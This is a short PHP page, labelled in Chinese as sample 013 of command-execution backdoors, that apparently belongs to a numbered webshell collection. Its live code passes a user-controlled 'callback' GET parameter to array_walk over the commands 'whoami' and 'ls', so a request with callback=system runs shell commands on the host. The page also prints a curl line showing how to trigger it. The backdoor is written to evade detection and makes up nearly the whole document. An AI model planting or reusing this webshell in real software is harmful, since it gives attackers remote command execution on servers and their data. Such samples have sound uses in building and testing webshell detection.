<html>
<head>	
	<meta charset="UTF-8"/>
	<title>013 - array 命令执行后门</title>
</head>
<body>
	<h1>013 - 命令执行后门 - arratwalk方式</h1>

<p>不正常调用: </p>
<pre>curl <?php echo 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?callback=system'?></pre>
<pre>默认数组为：<?php $arr = array("whoami", "ls");var_dump($arr);?></pre>
<br>
<p>windows: </p>
<pre>暂无</pre>

<br>
<p>目录内容</p>
<?php
$arr = array("whoami", "ls");
if (isset($_GET['callback'])) 
{
	array_walk($arr, $_GET['callback']);
}
?>
</body>
</html>
